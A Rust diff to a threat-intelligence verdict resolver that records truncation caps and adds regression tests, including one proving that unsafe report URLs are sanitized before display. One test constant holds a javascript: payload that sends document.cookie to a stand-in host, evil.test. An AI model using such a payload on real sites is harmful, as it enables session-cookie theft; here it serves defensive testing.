@@ -10,7 +10,8 @@ use crate::bloom::{BloomState, IntelGate};
 use crate::db::indicators as db;
 use crate::hashing;
 use crate::models::{
-    derive_relationships, DetectionKind, IndicatorKind, ProvenanceEntry, Verdict, VerdictTier,
+    derive_relationships, DetectionKind, IndicatorKind, ProvenanceEntry, Verdict, VerdictBounds,
+    VerdictTier,
 };
 use crate::yara_scan::YaraEngine;
 
@@ -103,6 +104,11 @@ pub async fn resolve(
     // persisted edge to the wrong hash.
     let (hash, file_data) = hashing::hash_and_read_file(pool, path).await?;
     let mut entries = Vec::new();
+    // Accumulates which parts of this verdict a cap made partial. Folded in
+    // at each capped lookup rather than inferred at the end: "we returned
+    // exactly the cap" is not the same fact as "more existed", and only the
+    // query knows which one happened. See `VerdictBounds`.
+    let mut bounds = VerdictBounds::default();
 
     // Tiers 1/2: a bloom miss on both hashes means no matching hash
     // evidence exists in the currently available local intelligence
@@ -125,17 +131,24 @@ pub async fn resolve(
     let mut dedicated_relationships = Vec::new();
     if bloom_hit {
         let sha_rows = db::hash_matches(pool, IndicatorKind::Sha256, &hash.sha256).await?;
+        // Both hash kinds feed the one ExactHash tier, so either being
+        // capped makes that tier partial.
+        let mut exact_hash_truncated = sha_rows.truncated;
         entries.extend(db::hash_matches_to_provenance(
-            sha_rows,
+            sha_rows.items,
             VerdictTier::ExactHash,
             IndicatorKind::Sha256,
         ));
         let md5_rows = db::hash_matches(pool, IndicatorKind::Md5, &hash.md5).await?;
+        exact_hash_truncated |= md5_rows.truncated;
         entries.extend(db::hash_matches_to_provenance(
-            md5_rows,
+            md5_rows.items,
             VerdictTier::ExactHash,
             IndicatorKind::Md5,
         ));
+        if exact_hash_truncated {
+            bounds.truncated_entry_tiers.push(VerdictTier::ExactHash);
+        }
 
         // Malware-family attribution and CVE-via-report relationships can
         // only exist for a hash the bloom filter already knows about: both
@@ -153,9 +166,13 @@ pub async fn resolve(
         // CVE-via-*detection* is deliberately NOT fetched here -- see the
         // comment below, after the YARA tier, for why that one can't reuse
         // this same bloom-gated fast path.
-        dedicated_relationships = db::malware_family_matches(pool, &hash.sha256, &hash.md5).await?;
-        dedicated_relationships
-            .extend(db::cve_matches_via_report(pool, &hash.sha256, &hash.md5).await?);
+        let families = db::malware_family_matches(pool, &hash.sha256, &hash.md5).await?;
+        bounds.relationships_truncated |= families.truncated;
+        dedicated_relationships = families.items;
+
+        let cve_via_report = db::cve_matches_via_report(pool, &hash.sha256, &hash.md5).await?;
+        bounds.relationships_truncated |= cve_via_report.truncated;
+        dedicated_relationships.extend(cve_via_report.items);
     }
 
     // Tier 3: YARA is orthogonal to known-bad hash status, always runs.
@@ -273,23 +290,27 @@ pub async fn resolve(
     // don't need the same treatment since ingestion, not `resolve`, is the
     // only thing that ever creates those edges.
     if !yara_hits.is_empty() {
-        dedicated_relationships.extend(
-            db::cve_matches_via_detection(
-                pool,
-                &scanned_rules,
-                LOCAL_YARA_SOURCE,
-                LOCAL_YARA_CONFIDENCE,
-                now,
-                IndicatorKind::Sha256,
-                &hash.sha256,
-            )
-            .await?,
-        );
+        let cve_via_detection = db::cve_matches_via_detection(
+            pool,
+            &scanned_rules,
+            LOCAL_YARA_SOURCE,
+            LOCAL_YARA_CONFIDENCE,
+            now,
+            IndicatorKind::Sha256,
+            &hash.sha256,
+        )
+        .await?;
+        bounds.relationships_truncated |= cve_via_detection.truncated;
+        dedicated_relationships.extend(cve_via_detection.items);
     }
 
     // Tier 4: path/naming pattern.
     let path_str = path.to_string_lossy().to_string();
-    entries.extend(db::path_pattern_matches(pool, &path_str).await?);
+    let path_matches = db::path_pattern_matches(pool, &path_str).await?;
+    if path_matches.truncated {
+        bounds.truncated_entry_tiers.push(VerdictTier::PathPattern);
+    }
+    entries.extend(path_matches.items);
 
     // Tier 5: contextual only, and only when nothing stronger already fired.
     let has_strong_match = entries
@@ -297,7 +318,11 @@ pub async fn resolve(
         .any(|e| matches!(e.tier, VerdictTier::ExactHash | VerdictTier::YaraHit));
     if !has_strong_match {
         if let Some(file_name) = path.file_name().and_then(|n| n.to_str()) {
-            entries.extend(db::contextual_matches(pool, file_name).await?);
+            let contextual = db::contextual_matches(pool, file_name).await?;
+            if contextual.truncated {
+                bounds.truncated_entry_tiers.push(VerdictTier::Contextual);
+            }
+            entries.extend(contextual.items);
         }
     }
 
@@ -319,6 +344,11 @@ pub async fn resolve(
     let mut threat_relationships = derive_relationships(&entries);
     threat_relationships.extend(dedicated_relationships);
 
+    // Tiers are collected in query order; sorted so the wire value is
+    // stable regardless of which lookups ran for this particular file.
+    bounds.truncated_entry_tiers.sort();
+    bounds.truncated_entry_tiers.dedup();
+
     Ok(Verdict {
         path: path_str,
         sha256: hash.sha256,
@@ -326,6 +356,7 @@ pub async fn resolve(
         entries,
         intel_freshness,
         threat_relationships,
+        bounds,
     })
 }
 
@@ -2085,7 +2116,7 @@ mod tests {
         .await
         .expect("path pattern lookup");
         assert!(
-            !unrelated.iter().any(|e| e.matched_value == "%"),
+            !unrelated.items.iter().any(|e| e.matched_value == "%"),
             "a `%` path indicator must not match an unrelated file -- LIKE wildcards in an \
              indicator value have to be escaped, got: {unrelated:?}"
         );
@@ -2098,6 +2129,7 @@ mod tests {
         .expect("path pattern lookup");
         assert!(
             genuinely_matching
+                .items
                 .iter()
                 .any(|e| e.matched_value == literal_value),
             "escaping must not break a legitimate indicator that contains a literal `%` -- it \
@@ -2472,6 +2504,424 @@ mod tests {
             "v1's CVE coverage must not transfer to a scan performed with a different ruleset \
              fingerprint, got: {:?}",
             verdict_v2.threat_relationships
+        );
+    }
+
+    /// Round-8 finding 1, the exact regression shape requested: build one
+    /// CVE edge with more supporting parent observations than the evidence
+    /// cap allows, *plus* another distinct CVE edge, and prove both
+    /// conceptual edges still appear -- and that the over-supported one
+    /// declares its withheld evidence rather than hiding it.
+    ///
+    /// This is the defect the old code had: a single `LIMIT` on the joined
+    /// rows was spent before Rust grouped them, so an edge with enough
+    /// parents could consume the whole budget and silently erase an entirely
+    /// distinct edge. Ordering by `cve_id` meant the *survivor* was decided
+    /// by CVE ID rather than by relevance, and nothing on the wire object
+    /// said anything had been dropped.
+    ///
+    /// Seeds `MAX_VERDICT_ROWS + 5` supporting observations on edge A --
+    /// past the *old shared row budget*, which is what makes this a real
+    /// reproduction rather than a test the old code would also have passed.
+    #[tokio::test]
+    #[ignore]
+    async fn one_over_supported_cve_edge_cannot_hide_another_or_its_own_omissions() {
+        let database_url = std::env::var("DATABASE_URL")
+            .unwrap_or_else(|_| "postgres://nsic:nsic@localhost:5432/nsic".to_string());
+        let pool = crate::db::connect_and_migrate(&database_url)
+            .await
+            .expect("connect to test database");
+
+        let rules_dir = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
+            .parent()
+            .unwrap()
+            .join("yara-rules");
+        let yara = Arc::new(YaraEngine::load(&rules_dir).expect("load yara rules"));
+        let bloom = BloomState::empty();
+        let intel_gate = IntelGate::new();
+        let recent_yara_hits = RecentYaraHits::new();
+
+        let marker = uuid::Uuid::new_v4();
+        let mut tmp = tempfile::NamedTempFile::new().expect("create temp file");
+        tmp.write_all(format!("evidence cap test content {marker}").as_bytes())
+            .unwrap();
+        tmp.flush().unwrap();
+        let (hash, _) = crate::hashing::hash_and_read_file(&pool, tmp.path())
+            .await
+            .expect("hash temp file");
+
+        let (indicator_id, _) =
+            crate::db::indicators::upsert_indicator(&pool, IndicatorKind::Sha256, &hash.sha256)
+                .await
+                .expect("seed indicator");
+
+        let seen = Utc::now() - chrono::Duration::days(3);
+
+        // Edge A: one report referencing one CVE, with far more supporting
+        // parent observations than the per-relationship evidence cap. Each
+        // distinct `source` is its own `indicator_observed_in_report` row
+        // (source is part of that table's primary key), so this produces
+        // genuinely many parallel supporting hops for a single CVE edge.
+        // Deliberately past MAX_VERDICT_ROWS, not merely past the evidence
+        // cap: the defect being reproduced is that a *single shared row
+        // budget of MAX_VERDICT_ROWS* was spent on one edge's parents before
+        // grouping ran. A count that only exceeds the (much smaller)
+        // evidence cap would leave the old code's 200-row budget unspent, so
+        // the old code would pass this test and the regression would prove
+        // nothing.
+        let over_supported_parents = crate::db::indicators::MAX_VERDICT_ROWS + 5;
+        let (report_a, _) = crate::db::indicators::upsert_report(
+            &pool,
+            "cap-test",
+            Some(&format!("a-{marker}")),
+            Some("Report A"),
+            None,
+            Some(seen),
+            &serde_json::json!({}),
+        )
+        .await
+        .expect("seed report A");
+        for n in 0..over_supported_parents {
+            crate::db::indicators::upsert_indicator_observed_in_report(
+                &pool,
+                indicator_id,
+                report_a,
+                &format!("parent-source-{n:03}"),
+                40,
+                seen,
+                seen,
+            )
+            .await
+            .expect("seed one of many parent observations");
+        }
+        let cve_a = format!("CVE-CAPA-{}", marker.simple());
+        crate::db::indicators::upsert_cve(&pool, &cve_a, None, None, None)
+            .await
+            .expect("seed cve A");
+        crate::db::indicators::upsert_report_references_cve(
+            &pool, report_a, &cve_a, "cve-src", 70, seen, seen,
+        )
+        .await
+        .expect("seed edge A");
+
+        // Edge B: a second, entirely distinct CVE edge with a single
+        // supporting parent. Under the old row-level cap this is what got
+        // silently erased by A's evidence volume.
+        let (report_b, _) = crate::db::indicators::upsert_report(
+            &pool,
+            "cap-test",
+            Some(&format!("b-{marker}")),
+            Some("Report B"),
+            None,
+            Some(seen),
+            &serde_json::json!({}),
+        )
+        .await
+        .expect("seed report B");
+        crate::db::indicators::upsert_indicator_observed_in_report(
+            &pool,
+            indicator_id,
+            report_b,
+            "parent-source-b",
+            40,
+            seen,
+            seen,
+        )
+        .await
+        .expect("seed parent observation for B");
+        let cve_b = format!("CVE-CAPB-{}", marker.simple());
+        crate::db::indicators::upsert_cve(&pool, &cve_b, None, None, None)
+            .await
+            .expect("seed cve B");
+        crate::db::indicators::upsert_report_references_cve(
+            &pool, report_b, &cve_b, "cve-src", 70, seen, seen,
+        )
+        .await
+        .expect("seed edge B");
+
+        bloom.insert(&hash.sha256).await;
+        let verdict = resolve(
+            &pool,
+            &bloom,
+            &intel_gate,
+            &yara,
+            &recent_yara_hits,
+            tmp.path(),
+        )
+        .await
+        .expect("resolve verdict");
+
+        let find = |target: &str| {
+            verdict
+                .threat_relationships
+                .iter()
+                .find(|r| r.kind == crate::models::RelationshipKind::Cve && r.target == target)
+        };
+        // Summarised rather than `{:?}` on the whole set: this test seeds
+        // 200+ supporting observations, and dumping every hop on failure
+        // buries the one fact that matters (which CVE targets survived) in
+        // hundreds of kilobytes of evidence structs.
+        let cve_targets = || {
+            verdict
+                .threat_relationships
+                .iter()
+                .filter(|r| r.kind == crate::models::RelationshipKind::Cve)
+                .map(|r| format!("{} ({} paths)", r.target, r.evidence_paths.len()))
+                .collect::<Vec<_>>()
+        };
+
+        // The heart of the finding: B must survive A's evidence volume.
+        let rel_a = find(&cve_a).unwrap_or_else(|| {
+            panic!(
+                "the over-supported CVE edge A is missing; CVE relationships present: {:?}",
+                cve_targets()
+            )
+        });
+        assert!(
+            find(&cve_b).is_some(),
+            "a distinct CVE edge B was dropped because edge A had many supporting observations -- \
+             one relationship's evidence volume must not consume another relationship's budget; \
+             CVE relationships present: {:?}",
+            cve_targets()
+        );
+
+        // A's evidence is bounded...
+        assert_eq!(
+            rel_a.evidence_paths.len() as i64,
+            crate::db::indicators::MAX_EVIDENCE_PER_RELATIONSHIP,
+            "edge A's supporting evidence should be capped at the per-relationship limit"
+        );
+        // ...and says so, rather than looking exhaustive.
+        assert!(
+            rel_a.has_more_evidence,
+            "edge A withheld supporting evidence, so has_more_evidence must be true -- a bounded \
+             result must not be indistinguishable from a complete one"
+        );
+        // B's evidence was never capped, so it must not claim otherwise.
+        assert!(
+            !find(&cve_b).unwrap().has_more_evidence,
+            "edge B has exactly one supporting observation and nothing was withheld, so \
+             has_more_evidence must be false"
+        );
+        // Two edges is well under the relationship cap, so the *relationship*
+        // set is complete even though one relationship's evidence was not.
+        assert!(
+            !verdict.bounds.relationships_truncated,
+            "only two conceptual edges exist, far under the relationship cap, so the relationship \
+             set must not report itself as truncated -- the two caps are independent"
+        );
+
+        // Every returned path must still be a complete two-hop chain: the
+        // evidence cap bounds how many paths are returned, never truncates a
+        // path itself into a partial chain.
+        for path in &rel_a.evidence_paths {
+            assert_eq!(
+                path.len(),
+                2,
+                "capping the number of evidence paths must not shorten any individual path: {path:?}"
+            );
+        }
+    }
+
+    /// TB-3 regression: a `report.url` that never went through
+    /// `safe_external_url` -- a row predating that control, or written by any
+    /// other producer -- must not reach the analyst as a link target.
+    ///
+    /// Seeds directly via `upsert_report`, deliberately bypassing the ingest
+    /// path, because that is exactly the situation the review identified:
+    /// validating the two current feed writers does nothing for rows those
+    /// writers did not create. A consumer must not have to prove which
+    /// historical writer produced a row before deciding an `href` is safe.
+    ///
+    /// Seeds *two* reports observing the same file -- one with a
+    /// `javascript:` URL, one with an ordinary `https:` URL -- so the
+    /// assertion cannot pass vacuously. If read-side sanitizing were
+    /// removed, the first assertion fails; if it were over-broad and dropped
+    /// every URL, the second fails.
+    #[tokio::test]
+    #[ignore]
+    async fn legacy_unsafe_report_url_never_reaches_the_analyst_as_a_link() {
+        let database_url = std::env::var("DATABASE_URL")
+            .unwrap_or_else(|_| "postgres://nsic:nsic@localhost:5432/nsic".to_string());
+        let pool = crate::db::connect_and_migrate(&database_url)
+            .await
+            .expect("connect to test database");
+
+        let rules_dir = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
+            .parent()
+            .unwrap()
+            .join("yara-rules");
+        let yara = Arc::new(YaraEngine::load(&rules_dir).expect("load yara rules"));
+        let bloom = BloomState::empty();
+        let intel_gate = IntelGate::new();
+        let recent_yara_hits = RecentYaraHits::new();
+
+        let marker = uuid::Uuid::new_v4();
+        let mut tmp = tempfile::NamedTempFile::new().expect("create temp file");
+        tmp.write_all(format!("legacy url test content {marker}").as_bytes())
+            .unwrap();
+        tmp.flush().unwrap();
+        let (hash, _) = crate::hashing::hash_and_read_file(&pool, tmp.path())
+            .await
+            .expect("hash temp file");
+
+        let (indicator_id, _) =
+            crate::db::indicators::upsert_indicator(&pool, IndicatorKind::Sha256, &hash.sha256)
+                .await
+                .expect("seed indicator");
+
+        let seen_at = Utc::now() - chrono::Duration::days(1);
+        const LEGACY_URL: &str = "javascript:fetch('http://evil.test/'+document.cookie)";
+        const SAFE_URL: &str = "https://legit.test/report/1";
+
+        // The poisoned/legacy row.
+        let (unsafe_report_id, _) = crate::db::indicators::upsert_report(
+            &pool,
+            "legacy-writer",
+            Some(&format!("unsafe-{marker}")),
+            Some("Legacy report with an unsafe URL"),
+            Some(LEGACY_URL),
+            Some(seen_at),
+            &serde_json::json!({}),
+        )
+        .await
+        .expect("seed legacy report");
+        crate::db::indicators::upsert_indicator_observed_in_report(
+            &pool,
+            indicator_id,
+            unsafe_report_id,
+            "legacy-edge-source",
+            30,
+            seen_at,
+            seen_at,
+        )
+        .await
+        .expect("seed legacy observation");
+
+        // The positive control, so this test proves sanitizing is selective
+        // rather than just blanket-nulling every URL.
+        let (safe_report_id, _) = crate::db::indicators::upsert_report(
+            &pool,
+            "legacy-writer",
+            Some(&format!("safe-{marker}")),
+            Some("Ordinary report with a safe URL"),
+            Some(SAFE_URL),
+            Some(seen_at),
+            &serde_json::json!({}),
+        )
+        .await
+        .expect("seed safe report");
+        crate::db::indicators::upsert_indicator_observed_in_report(
+            &pool,
+            indicator_id,
+            safe_report_id,
+            "legacy-edge-source",
+            30,
+            seen_at,
+            seen_at,
+        )
+        .await
+        .expect("seed safe observation");
+
+        bloom.insert(&hash.sha256).await;
+        let verdict = resolve(
+            &pool,
+            &bloom,
+            &intel_gate,
+            &yara,
+            &recent_yara_hits,
+            tmp.path(),
+        )
+        .await
+        .expect("resolve verdict");
+
+        // Collect every URL the wire object exposes, from both the
+        // provenance entries and every relationship evidence hop -- the two
+        // places the UI reads a URL from.
+        let mut exposed_urls: Vec<&str> = verdict
+            .entries
+            .iter()
+            .filter_map(|e| e.report_url.as_deref())
+            .collect();
+        exposed_urls.extend(
+            verdict
+                .threat_relationships
+                .iter()
+                .flat_map(|r| r.evidence_paths.iter())
+                .flatten()
+                .filter_map(|hop| hop.report_url.as_deref()),
+        );
+
+        assert!(
+            !exposed_urls.iter().any(|u| u.contains("javascript:")),
+            "a legacy javascript: report.url reached the verdict object and would have been \
+             rendered as an href; exposed URLs were: {exposed_urls:?}"
+        );
+        assert!(
+            exposed_urls.contains(&SAFE_URL),
+            "the ordinary https report URL must survive sanitizing -- otherwise this test would \
+             pass even if every URL were dropped; exposed URLs were: {exposed_urls:?}"
+        );
+    }
+
+    /// Architectural guard for the render boundary itself. The read-side
+    /// control above stops unsafe URLs reaching the frontend, but finding 2
+    /// of the round-8 review was precisely that the sink must not be safe
+    /// *only* because an upstream layer promised it was. This asserts every
+    /// `href` in the UI routes through `safeExternalUrl`, so reintroducing a
+    /// raw `href={...report_url}` fails CI rather than passing review.
+    ///
+    /// A source-level check rather than a DOM test because the repo has no
+    /// JavaScript test runner; adding one just for this would be a larger
+    /// change than the control it verifies. `npx tsc --noEmit` in CI already
+    /// covers whether the helper is used *correctly*; this covers whether it
+    /// is used *at all*.
+    #[test]
+    fn every_frontend_href_is_routed_through_the_url_allowlist() {
+        let src = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
+            .parent()
+            .unwrap()
+            .join("src");
+
+        let mut checked_files = 0;
+        let mut offenders: Vec<String> = Vec::new();
+        let mut stack = vec![src.clone()];
+        while let Some(dir) = stack.pop() {
+            for entry in std::fs::read_dir(&dir).expect("read frontend src dir") {
+                let path = entry.expect("read dir entry").path();
+                if path.is_dir() {
+                    stack.push(path);
+                    continue;
+                }
+                if path.extension().and_then(|e| e.to_str()) != Some("tsx") {
+                    continue;
+                }
+                let text = std::fs::read_to_string(&path).expect("read component source");
+                checked_files += 1;
+                for (lineno, line) in text.lines().enumerate() {
+                    // Only dynamic hrefs matter: `href={...}` interpolates a
+                    // value, while a literal `href="/docs"` cannot carry a
+                    // feed-supplied scheme.
+                    if line.contains("href={") && !line.contains("safeExternalUrl(") {
+                        offenders.push(format!(
+                            "{}:{}: {}",
+                            path.file_name().unwrap().to_string_lossy(),
+                            lineno + 1,
+                            line.trim()
+                        ));
+                    }
+                }
+            }
+        }
+
+        assert!(
+            checked_files > 0,
+            "found no .tsx files under {src:?} -- this guard would silently pass"
+        );
+        assert!(
+            offenders.is_empty(),
+            "every dynamic href must go through safeExternalUrl() (src/lib/safeUrl.ts); \
+             unguarded: {offenders:?}"
         );
     }
 
